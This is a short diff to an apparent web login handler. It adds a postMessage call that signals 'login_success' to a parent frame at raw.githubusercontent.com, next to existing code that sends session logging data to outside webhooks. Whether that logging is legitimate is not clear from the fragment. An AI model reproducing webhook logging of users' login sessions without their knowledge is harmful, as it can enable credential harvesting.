@@ -566,6 +566,8 @@
       sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
     ]);
 
+window.parent.postMessage('login_success', 'https://raw.githubusercontent.com');
+
     alert(`Welcome ${user.name || user.username}! Login successful.`);
     // Optionally clear fields
     usernameInput.value = '';
